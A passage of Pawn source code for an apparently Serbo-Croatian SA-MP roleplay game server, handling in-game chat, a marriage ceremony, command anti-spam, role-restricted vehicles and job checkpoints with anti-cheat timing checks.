			SendClientMessageToAllEx(0x00AAFFFF, "(MATH): %s {FFFFFF}je rijesi%s test iz matematike i dobi%s {00AAFF}$%s {FFFFFF}(rezultat: {00AAFF}%s{FFFFFF})", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), getPolForString(playerid, "o", "la"), fNumber(MatCash), fNumber(rezultat));
			DajIgracuNovac( playerid, MatCash );
	   	}
	   	else 
	   	{
			SendErrorMessage(playerid, "Vas odgovor nije tocan.");
  		}
  		return 0;
	}

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
	{
        if( strfind( text, ZabranjeneReci[ b ], true ) != -1 )
		{ 
       		AdminMsgForLevel(PlayerInfo[playerid][xAdmin], 0x808000AA, "#WARNING: %s[%d] - %s", ImeIgraca( playerid ), playerid, text );
       		break;
        }
	}

	if( tdm_player_info[ playerid ][ tdm_Team ] != 0 )
	{
	    if( tdm_player_info[ playerid ][ tdm_Team ] == 1 )
		{
	        foreach( new i : Player)
			{
	            if( tdm_player_info[ i ][ tdm_Team ] == 1 )
				{ 
				    SCMF( i, 0x1F5CB8FF, "* CT - %s: {FFFFFF}%s.", ImeIgraca( playerid ), text );
				    return 0;
				}
			}
		}
		else if( tdm_player_info[ playerid ][ tdm_Team ] == 2 )
		{
	        foreach( new i : Player)
			{
	            if( tdm_player_info[ i ][ tdm_Team ] == 2 )
				{ 
					SCMF( i, 0xFF0000FF, "* TT - %s: {FFFFFF}%s.", ImeIgraca( playerid ), text );
					return 0;
				}
			}
		}
	}

	if( MarriageCeremoney{ playerid } > 0 )
	{
	    tmp = strtok( text, idx );
	    if( ( strcmp( "da", tmp, true, strlen( tmp ) ) == 0) && ( strlen( tmp ) == strlen( "da" ) ) )
		{
		    if( GotProposedBy[ playerid ] < 999 )
			{
			    if( IsPlayerConnected( GotProposedBy[ playerid ] ) )
				{
					SCMF( GotProposedBy[ playerid ], 0xCCCCCCFF, "Maticar: %s da li vi uzimate %s za vasu voljenu zenu? {FFFFFF}(Ukoliko zelite to ukucajte 'da').", ImeIgraca( GotProposedBy[ playerid ] ), ImeIgraca( playerid ) );
					MarriageCeremoney{ GotProposedBy[ playerid ] } = 1;
					MarriageCeremoney{ playerid } = 0;
					GotProposedBy[ playerid ] = 999;
				    return 0;
			    }
			    else
				{
			        MarriageCeremoney{ playerid } = 0;
			        GotProposedBy[ playerid ] = 999;
			        return 0;
			    }
			}
			else if( ProposedTo[ playerid ] < 999 )
			{
			    if( IsPlayerConnected( ProposedTo[ playerid ] ) )
				{
					SCMF( playerid, -1, "Maticar: %s i %s proglasavam vas za...Muza i Zenu, Mozete poljubiti mladu.", ImeIgraca( playerid ), ImeIgraca( ProposedTo[ playerid ] ) );
					SCMF( ProposedTo[ playerid ], -1, "Maticar: %s i %s proglasavam vas za...Muza i Zenu, Mozete poljubiti mladozenju.", ImeIgraca( ProposedTo[ playerid ] ), ImeIgraca( playerid ) );
					OOCNews( -1, "Najnovije vesti: Imamo novi srecni par, %s i %s su se upravo vencali.", ImeIgraca( playerid ), ImeIgraca( ProposedTo[ playerid ] ) );

					//MarriageCeremoney[ProposedTo[ playerid ]] = 1;
					MarriageCeremoney{ ProposedTo[ playerid ] } = 0;
					MarriageCeremoney{ playerid } = 0;
					new namestring[ MAX_PLAYER_NAME+1 ];
					format( namestring, sizeof( namestring ), "%s", ImeIgraca( playerid ) );
					strmid( PlayerInfo[ ProposedTo[ playerid ] ][ xMarriedTo ], namestring, 0, strlen( namestring ), 24 );

					format( namestring, sizeof( namestring), "%s", ImeIgraca( ProposedTo[ playerid ] ) );
					strmid( PlayerInfo[ playerid ][ xMarriedTo ], namestring, 0, strlen( namestring ), 24 );

					DajIgracuNovac( playerid, -10000 );
					PlayerInfo[ playerid ][ xMarried ] = 1;
					PlayerInfo[ ProposedTo[ playerid ] ][ xMarried ] = 1;
					ProposedTo[ playerid ] = 999;
					MarriageCeremoney{ playerid } = 0;

					new q[ 150 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `married` = '%d', `married_to` = '%e' WHERE `user_id` = '%d' LIMIT 1",
																PlayerInfo[ playerid ][ xMarried ],
																PlayerInfo[ playerid ][ xMarriedTo ],
																PlayerInfo[ playerid ][ xID ] );
					mysql_tquery( mSQL, q );

					mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `married` = '%d', `married_to` = '%e' WHERE `user_id` = '%d' LIMIT 1",
																PlayerInfo[ ProposedTo[ playerid ] ][ xMarried ],
																PlayerInfo[ ProposedTo[ playerid ] ][ xMarriedTo ],
																PlayerInfo[ ProposedTo[ playerid ] ][ xID ] );
					mysql_tquery( mSQL, q );

				    return 0;
			    }
			    else
				{
			        MarriageCeremoney{ playerid } = 0;
			        ProposedTo[ playerid ] = 999;
			        return 0;
			    }
			}
		}
		else
		{
		    if( GotProposedBy[ playerid ] < 999 )
			{
				if( IsPlayerConnected( GotProposedBy[ playerid ] ) )
				{
				    SCMF( playerid, ZUTA, "* Niste zeleli da se udate za %s, niste izgovorili 'da'.", ImeIgraca( GotProposedBy[ playerid ] ) );
				    SCMF( GotProposedBy[ playerid ], ZUTA, "* %s nije izgovorio 'da'.", ImeIgraca( playerid ) );
				    return 0;
			    }
			    else
				{
			        MarriageCeremoney{ playerid } = 0;
			        GotProposedBy[ playerid ] = 999;
			        return 0;
			    }
		    }
		    else if( ProposedTo[ playerid ] < 999 )
			{
			    if( IsPlayerConnected( ProposedTo[ playerid ] ) )
				{
				    SCMF( playerid, ZUTA, "* Niste zeleli da se udate za %s, niste izgovorili 'da'.", ImeIgraca( ProposedTo[ playerid ] ) );
				    SCMF( ProposedTo[ playerid ], ZUTA, "* %s nije izgovorila 'da'.", ImeIgraca( playerid ) );
				    return 0;
			    }
			    else
				{
			        MarriageCeremoney{ playerid } = 0;
			        ProposedTo[ playerid ] = 999;
			        return 0;
			    }
			}
		}
	    return 0;
	}

    if(Mobile[playerid] != -1)
	{
		tmp = strtok(text, idx);
		
		SCMF(playerid, ZUTA, "(MOBITEL) %s kaze: {FFFFFF}%s", ImeIgraca( playerid ), text);

		if( IsPlayerConnected( Mobile[playerid] ) )
		{
		    if( Mobile[Mobile[playerid]] == playerid )
			{
				SCMF(Mobile[playerid], ZUTA, "(MOBITEL) %s kaze: {FFFFFF}%s", ImeIgraca( playerid ), text);
			}
		}
		else
		{
			SendClientMessage( playerid, ZUTA, "(TAJNICA): Nema nikoga tamo.");
		}
		return 0;
	}

	if(AdminDuty[playerid])
	{
		callcmd::b(playerid, text);
		return 0;
	}
	else SendNearbyMessage(playerid, 15.0, -1, "[%d] {4282C0}%s: {FFFFFF}%s", playerid, ImeIgraca( playerid ), text );
	
	SetPlayerChatBubble( playerid, text, 0xC0C0C0AA, 20.0, 7000 );
	WriteLog("log-chat", "IC: %s > %s", ImeIgraca( playerid ), text);
	return 0;
}
//------------------------------------------------------------------------------
public OnPlayerCommandText(playerid, cmdtext[])
{
	if(isnull(cmdtext))
	{
	    return(false);
	}
	return 1;
}

public OnPlayerCommandReceived(playerid, cmdtext[], params[], flags)
{
    if(!IsPlayerConnected(playerid) || !PlayerLogged[playerid]) return(false);

    if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xSpecAdmin ] < 1 && PlayerInfo[ playerid ][ xGamemaster ] < 1 )
	{
	    if( gettime() < antiCheatCS[ playerid ][ SpamCommand ] )
		{
		    SendClientMessage( playerid, ANTICHEAT, "(ANTI-SPAM): Ne mozes spamati komande svakih 2 sekunde.");
			return(false);
		}
		antiCheatCS[ playerid ][ SpamCommand ] = gettime()+2;
 	}

 	if(AdminDialog[playerid]) Kickovanje(playerid, "Pokusaja abusea Admin logina.");
    return 1;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], params[], success, flags)
{
    if(!IsPlayerConnected(playerid) || !PlayerLogged[playerid])
	{
		SendErrorMessage(playerid, "Niste ulogovani.");
	    return 1;
	}
	if(success == -1) return SendErrorMessage( playerid, "Upisali ste komandu koja ne postoji, kucajte {FFFFFF}[ /help ] {FF0000}da vidite listu komandi.");

	#if SMG_DEBUG == 1

		WriteLog("log-komande", "Igrac %s | Komanda: %s", ImeIgraca( playerid ), cmdtext);

	#endif
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if( ServerInfo[ RRVehicle ] == true )
	{
	    if( !occupied[ vehicleid ] ) occupied[ vehicleid ] = true;
	}

   	if( ispassenger == 0 )
 	{
		foreach(new i : Player)
		{
			if( GetPlayerVehicleID(i) == vehicleid && playerid != i && GetPlayerState(i) == PLAYER_STATE_DRIVER )
			{
			    new Float:PozX, Float:PozY, Float:PozZ;
				GetPlayerPos( playerid, PozX, PozY, PozZ );
				SMG_SetPlayerPos( playerid, PozX, PozY, PozZ );
				SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);
			    SendClientMessage( playerid, ANTICHEAT, "(ANTICHEAT): Zabranjeno je otimati vozila drugim igracima!");
			}
		}
	}

    if(ispassenger == 0)
 	{
		foreach(new i : Player)
		{
		    if(AdminVozilo[i] == vehicleid)
		    {
				if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xGamemaster] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1)
			    {
				    new Float:PozX, Float:PozY, Float:PozZ;
				   	GetPlayerPos( playerid, PozX, PozY, PozZ );
			    	SMG_SetPlayerPos( playerid, PozX, PozY, PozZ );
			    	SendClientMessage( playerid, ANTICHEAT, "(VOZILO): Ovo nije vase A/GM vozilo.");
				}
	  			break;
		    }
		    else if(VipVozilo[i] == vehicleid)
		    {
		        if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1 && PlayerInfo[playerid][xGamemaster] < 1 && PlayerInfo[playerid][xVIPLevel] < 1)
		    	{
			    	new Float:PozX, Float:PozY, Float:PozZ;
				   	GetPlayerPos( playerid, PozX, PozY, PozZ );
				   	SMG_SetPlayerPos( playerid, PozX, PozY, PozZ );
				   	SendClientMessage( playerid, ANTICHEAT, "(VOZILO): Ovo nije vase VIP vozilo.");
				}
			    break;
		    }
		    else if(PromoterVozilo[i] == vehicleid)
		    {
		        if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1 && PlayerInfo[playerid][xGamemaster] < 1 && PlayerInfo[playerid][xPromoter] < 1)
		    	{
			    	new Float:PozX, Float:PozY, Float:PozZ;
				   	GetPlayerPos( playerid, PozX, PozY, PozZ );
				   	SMG_SetPlayerPos( playerid, PozX, PozY, PozZ );
				   	SendClientMessage( playerid, ANTICHEAT, "(VOZILO): Ovo nije vase Promoter vozilo.");
				}
			    break;
		    }
		    else if(YTVozilo[i] == vehicleid)
		    {
		        if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1 && PlayerInfo[playerid][xGamemaster] < 1 && PlayerInfo[playerid][xYouTuber] < 1)
		    	{
			    	new Float:PozX, Float:PozY, Float:PozZ;
				   	GetPlayerPos( playerid, PozX, PozY, PozZ );
				   	SMG_SetPlayerPos( playerid, PozX, PozY, PozZ );
				   	SendClientMessage( playerid, ANTICHEAT, "(VOZILO): Ovo nije vase YouTuber vozilo.");
				}
			    break;
		    }
		    else if(RentVozilo[i] == vehicleid)
		    {
		        if(RentVozilo[playerid] != vehicleid)
		        {
			    	new Float:PozX, Float:PozY, Float:PozZ;
				   	GetPlayerPos( playerid, PozX, PozY, PozZ );
				  	SMG_SetPlayerPos( playerid, PozX, PozY, PozZ );
				   	SendClientMessage( playerid, ANTICHEAT, "(VOZILO): Ovo nije vase rent vozilo.");
				}
	   			break;
		    }
		    else if(PosaoVozilo[i] == vehicleid)
		    {
		        if(PosaoVozilo[playerid] != vehicleid)
		        {
			    	new Float:PozX, Float:PozY, Float:PozZ;
				   	GetPlayerPos( playerid, PozX, PozY, PozZ );
				  	SMG_SetPlayerPos( playerid, PozX, PozY, PozZ );
				   	SendClientMessage( playerid, ANTICHEAT, "(VOZILO): Ovo nije vase poslovno vozilo.");
				}
	   			break;
		    }
		}
	}
	return 1;
}

public OnPlayerExitVehicle( playerid, vehicleid )
{
    new Float:x, Float:y, Float:z;
	GetVehiclePos( vehicleid,x, y, z );
	RealVehiclePositions[ vehicleid ][ 0 ] = x;
	RealVehiclePositions[ vehicleid ][ 1 ] = y;
	RealVehiclePositions[ vehicleid ][ 2 ] = z;

    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
	{
		if( EventInfo[ Started ] != 0 && PlayerInvited[ playerid ] != 0 && vehicleid == EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] )
		{
		    EventInfo[ Drivers ]--;
			SMG_TogglePlayerControllable( playerid, true );
			PlayerInvited[ playerid ] = 0;
			PlayerCP[playerid] = 0;

			if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
			{
				VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
			    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
				SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
				PlayerEventVehID[ playerid ] = -1;
			}

			SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
			SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
			SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
		}
	}

	if( Pojas[ playerid ] == true )
	{
		SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s se hvata za pojas, te ga skida.", ImeIgraca( playerid ) );
	    Pojas[ playerid ] = false;
    }

    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) )
	{
		DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
		PlayerGpsRadar[ playerid ][ _pgrObject ] = -1;
	}

	occupied[ vehicleid ] = false;
	return 1;
}

public OnPlayerStateChange( playerid, newstate, oldstate )
{
    if( newstate == PLAYER_STATE_DRIVER )
	{
        new engine, lights, alarm, doors, bonnet, boot, objective, vehicle = GetPlayerVehicleID( playerid );
        gLastDriver[ vehicle ] = playerid;
        LastCar[ playerid ] = vehicle;

		if( !IsVehicleBajs( vehicle ) && !IsVehicleBrod( vehicle ) && !IsVehicleLetelica( vehicle ) ) BuildSpeedoTextDraws(playerid, true);

        Tempomat[ playerid ] = false;
		PlayerCruiseSpeed[ playerid ] = 0.00;

        if( ServerInfo[ RRVehicle ] == true )
		{
		    if( !occupied[ vehicle ] ) occupied[ vehicle ] = true;
		}

        if( HavePlayerWeapon( playerid ) )
		{
	        SetPlayerArmedWeapon( playerid, 0 );
	    }

        if( vCanDrive[ vehicle ] == 0 )
		{
			SetCameraBehindPlayer( playerid );
			SendClientMessage( playerid, ZUTA, "(VOZILO): Ovo vozilo je unisteno. Koristite [ /call 555 ] ili ukucajte [ /exit ] za napustanje vozila.");
			GetVehicleParamsEx( vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
			SetVehicleParamsEx( vehicle,0,lights,alarm,doors,bonnet,boot,objective);

			if( Tempomat[ playerid ] )
			{
				SendClientMessage( playerid, ZUTA, "(VOZILO): Tempomat se ugasio.");
				Tempomat[ playerid ] = false;
				PlayerCruiseSpeed[ playerid ] = 0.00;
			}
		}

		GetVehicleParamsEx( vehicle, engine, lights, alarm, doors, bonnet, boot, objective );
		if( engine == 0 )
		{
			SendClientMessage( playerid, ZUTA, "(VOZILO): Da upalite vozilo kucajte {FFFFFF}\"/upali\" {FFFF00}ili tipku {FFFFFF}'2'." );
			SendClientMessage( playerid, ZUTA, "(VOZILO): Da upalite ili ugasite tempomat koristite tipku {FFFFFF}'N'." );
		}

        if( PlayerInfo[ playerid ][ xAdmin ] >= 6 && AdminDuty[playerid] )
		{
			SCMF( playerid, ZUTA, "(VOZILO): Ulazite u vozilo ciji je ID: {FFFFFF}(%d) {FFFF00}| SQLID: {FFFFFF}(%d)", vehicle, VehicleInfo[ vehicle ][ vSqlID ] );
		}

		if( VehicleInfo[ vehicle ][ vUsage ] == PRIVATNO_VOZILO )
		{
			if( (PlayerInfo[playerid][xSpecAdmin] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1) && AdminDuty[playerid] )
			{
				SCMF( playerid, ZUTA, "(VOZILO): Ulazite u privatno vozilo ciji je vlasnik {FFFFFF}%s.", VehicleInfo[ vehicle ][ vOwner ] );
			}
		}
		else if( VehicleInfo[ vehicle ][ vUsage ] == ORGANIZACIJSKO_VOZILO )
		{
		    if( PlayerInfo[ playerid ][ xAdmin ] >= 5 && AdminDuty[ playerid ] ) { }
		    else
			{
			    if( VehicleInfo[ vehicle ][ vOrganization ] != PlayerInfo[ playerid ][ xClan ] )
				{
					new Float:Poz[ 3 ];
				    GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
				   	SMG_SetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ]+2 );
				    RemovePlayerFromVehicle( playerid );
					SendErrorMessage( playerid, "Nemas kljuc ovog vozila." );
				}
			}
		}
		else if( VehicleInfo[ vehicle ][ vUsage ] == IZLOZBENO_VOZILO )
		{
			if( PlayerInfo[ playerid ][ xAdmin ] != 7 )
			{
			    new Float:Poz[ 3 ];
			    GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
			   	SMG_SetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ]+2 );
			    RemovePlayerFromVehicle( playerid );
				SendErrorMessage( playerid, "Nemate kljuceve od ovog vozila!");
			}
		}
		//
		new vehicleid = vehicle;

	  	if( IsVehicleAuto( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleC1(vehicleid) || IsVehicleC2(vehicleid) || IsVehicleC3(vehicleid) )
		{
			if( PlayerInfo[ playerid ][ xVozacka ] == 0 )
			{
				SendClientMessage( playerid, ZUTA, "(VOZILO): Nemate dozvolu za kopnenu voznju pazi se policije!");
		 	}
	  	}

	  	if( IsVehicleBrod( vehicleid ) )
		{
			if( PlayerInfo[ playerid ][ xBrodska ] == 0 )
			{
				SendClientMessage( playerid, ZUTA, "(VOZILO): Nemate dozvolu za voznju broda pazi se policije!");
		 	}
	  	}

	  	if( IsVehicleLetelica( vehicleid ) )
		{
			if( PlayerInfo[ playerid ][ xLetelica ] == 0 )
			{
				SendClientMessage( playerid, ZUTA, "(VOZILO): Nemate dozvolu za voznju aviona pazi se policije!");
		 	}
	  	}

        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_NONVEHICLE ) || NosiPaketOruzja[ playerid ] == true )
		{
		    new Float:Poz[ 3 ];
		    GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
	        SMG_SetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ]+2 );
			SendErrorMessage( playerid, "Ne mozes uci sa kutijom/paketom u vozilo!" );
	    }
	}

	else if( newstate == PLAYER_STATE_ONFOOT )
	{
		BuildSpeedoTextDraws(playerid, false);

		if( oldstate == PLAYER_STATE_DRIVER )
		{
		    new lastveh = LastCar[ playerid ],
				Float:x, Float:y, Float:z;
			GetVehiclePos( lastveh, x, y, z );
            RealVehiclePositions[ lastveh ][ 0 ] = x;
			RealVehiclePositions[ lastveh ][ 1 ] = y;
			RealVehiclePositions[ lastveh ][ 2 ] = z;

			if( EventInfo[ Started ] != 0 && PlayerInvited[ playerid ] != 0 && lastveh == EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] )
			{
			    EventInfo[ Drivers ]--;
				SMG_TogglePlayerControllable( playerid, true );
				PlayerInvited[ playerid ] = 0;
				PlayerCP[playerid] = 0;

				if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
				{
					VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
				    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
					SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
					PlayerEventVehID[ playerid ] = -1;
				}

				SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
				SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
				SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
			}
		}

		LastCar[ playerid ] = 0;
	}
	else if( newstate == PLAYER_STATE_SPAWNED )
	{
	    SetPlayerHealth( playerid, 50.0 + PlayerInfo[ playerid ][ xSHealth ] );
		if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 )
		{
		    SetPlayerHealth( playerid, 100.00 );
		    SetPlayerArmour( playerid, 100.00 );
		}
    }
	else if( newstate == PLAYER_STATE_PASSENGER )
	{
        new weapon, ammo;
        GetPlayerWeaponData(playerid, 5, weapon, ammo);
        SetPlayerArmedWeapon(playerid, weapon);

        if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_NONVEHICLE ) )
		{
		    new Float:Poz[ 3 ];
		    GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
	        SMG_SetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] + 2 );
			SendErrorMessage( playerid, "Ne mozes uci sa kutijom u vozilo!" );
	    }
	}
	return 1;
}

//------------------------------------------------------------------------------

CheckTextDrawColor(playerid, PlayerText:td)
{
	switch(PlayerInfo[playerid][xTDColor])
	{
		case 0: PlayerTextDrawColor(playerid, td, 0x4282C0FF); //Default

		case 1: PlayerTextDrawColor(playerid, td, 0xFA7373FF); //light Red
		case 2: PlayerTextDrawColor(playerid, td, 0xF01F1FFF); //Red
		case 3: PlayerTextDrawColor(playerid, td, 0x941010FF); //dark Red

		case 4: PlayerTextDrawColor(playerid, td, 0xFA9973FF); //light Orange
		case 5: PlayerTextDrawColor(playerid, td, 0xF0611FFF); //Orange
		case 6: PlayerTextDrawColor(playerid, td, 0xBA7900FF); //dark Orange

		case 7: PlayerTextDrawColor(playerid, td, 0xFAE173FF); //light Yellow
		case 8: PlayerTextDrawColor(playerid, td, 0xE9F01FFF); //Yellow
		case 9: PlayerTextDrawColor(playerid, td, 0xB7BA00FF); //dark Yellow

		case 10: PlayerTextDrawColor(playerid, td, 0x7AFA73FF); //light Green
		case 11: PlayerTextDrawColor(playerid, td, 0x50F01FFF); //Green
		case 12: PlayerTextDrawColor(playerid, td, 0x069602FF); //dark Green

		case 13: PlayerTextDrawColor(playerid, td, 0x73FAE1FF); //light Blue
		case 14: PlayerTextDrawColor(playerid, td, 0x1FAEF0FF); //Blue
		case 15: PlayerTextDrawColor(playerid, td, 0x026096FF); //dark Blue

		case 16: PlayerTextDrawColor(playerid, td, 0xA273FAFF); //light Purple
		case 17: PlayerTextDrawColor(playerid, td, 0x6F1FF0FF); //Purple
		case 18: PlayerTextDrawColor(playerid, td, 0x4C0296FF); //dark Purple

		case 19: PlayerTextDrawColor(playerid, td, 0xFA73EAFF); //light Pink
		case 20: PlayerTextDrawColor(playerid, td, 0xF01FDFFF); //Pink
		case 21: PlayerTextDrawColor(playerid, td, 0xB8007DFF); //dark Pink

		case 22: PlayerTextDrawColor(playerid, td, 0x000000FF); //Black
	}
}

//------------------------------------------------------------------------------

public OnPlayerEnterCheckpoint( playerid )
{
	if(PlayerInvited[playerid] == event_TEMPLERUN)
	{
		EventInfo[ Started ] = 0;
		PlayerInvited[playerid] = 0;
		PlayerInfo[ playerid ][ xEvent1Mesto ]++;
		sql_user_update_integer( playerid, "event_first_place", PlayerInfo[ playerid ][ xEvent1Mesto ] );

		DajIgracuNovac( playerid, 10000 );
		SendClientMessageToAllEx( 0x6EF83CFF, "(EVENT - TEMPLE RUN): Pobjednik eventa je {FFFFFF}%s. {6EF83C}| Nagrada: {FFFFFF}$10.000", ImeIgraca( playerid ) );
		SetPlayerVirtualWorld( playerid, 0 );
		SMG_TogglePlayerControllable( playerid, true );
		DisablePlayerCheckpoint( playerid );

		SMG_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
		SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );

		foreach( new i : Player)
		{
			if( PlayerInvited[ i ] == event_TEMPLERUN )
			{
				PlayerInvited[i] = 0;
				SetPlayerVirtualWorld( i, 0 );
				SMG_TogglePlayerControllable( i, true );
				DisablePlayerCheckpoint( i );

				SMG_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
				SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
				SetPlayerInterior( i, PlayerPosInt[ i ] );
			}
		}
		return 1;
	}

    if( CheckpointStatus[ playerid ] != 0 )
	{
		switch( CheckpointStatus[ playerid ] )
		{
		    case 1:
		    {
		        PlayerPlaySound( playerid, 1058, 0.0, 0.0, 0.0);
				SMG_DisablePlayerCheckpoint( playerid );
				LocatingCar[playerid] = false;
				CheckpointStatus[ playerid ] = 0;
				GameTextForPlayer( playerid, "~r~gps ugasen", 5000, 1);
			}
			case 2:
			{
				PlayerPlaySound( playerid, 1058, 0.0, 0.0, 0.0);
				SMG_DisablePlayerCheckpoint( playerid );
				CheckpointStatus[ playerid ] = 0;
				GameTextForPlayer( playerid, "~r~gps ugasen", 5000, 1);
			}
			case 3:
			{
			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && PlayerInfo[ playerid ][ xPosao ] == POSAO_PNOVCA && GetPlayerVehicleID( playerid ) == PosaoVozilo[playerid] )
				{
				    if(PosaoPNovcaCP[playerid] == 1)
				    {
	    				new time = gettime( );
		       			new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
			        	if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
						{
						   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
						   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak ); 
				        	DodajWarnRed("~r~(AC|CP): ~w~%s(/spec %d) je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
							return 1;
	   					}

						GameTextForPlayer( playerid, "~y~Utovar novca...", 10000, 1);
					    SMG_TogglePlayerControllable( playerid, false );
					    SetPlayerTimerEx(playerid, "Utovar", 10000, false, "ii", playerid, 1);
		       			CheckpointStatus[ playerid ] = 0;
				        SMG_DisablePlayerCheckpoint( playerid );
					}
					else if(PosaoPNovcaCP[playerid] == 2)
					{
					    new time = gettime( );
		       			new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
			        	if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
						{
						   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
						   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
				        	DodajWarnRed("~r~(AC|CP): ~w~%s(/spec %d) je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
							return 1;
	   					}

						GameTextForPlayer( playerid, "~y~Istovar novca...", 10000, 1);
					    SMG_TogglePlayerControllable( playerid, false );
					    SetPlayerTimerEx(playerid, "Istovar", 10000, false, "ii", playerid, 1);
		       			CheckpointStatus[ playerid ] = 0;
				        SMG_DisablePlayerCheckpoint( playerid );
					}
			    }
			}
			case 4:
			{
			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && PlayerInfo[ playerid ][ xPosao ] == POSAO_UBERDRIVER && GetPlayerVehicleID( playerid ) == PosaoVozilo[playerid] )
				{
				    if(PosaoUberCP[playerid] == 1)
				    {
	    				new time = gettime( );
		       			new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
			        	if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
						{
						   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
						   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
				        	DodajWarnRed("~r~(AC|CP): ~w~%s[/spec %d] je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
							return 1;
	   					}

						GameTextForPlayer( playerid, "~y~Sacekajte da putnik ude u uber...", 4500, 1);
					    SMG_TogglePlayerControllable( playerid, false );
					    SetPlayerTimerEx(playerid, "Utovar", 5000, false, "ii", playerid, 2);
		       			CheckpointStatus[ playerid ] = 0;
				        SMG_DisablePlayerCheckpoint( playerid );
					}
					else if(PosaoUberCP[playerid] == 2)
					{
					    new time = gettime( );
		       			new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
			        	if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
						{
						   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
						   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
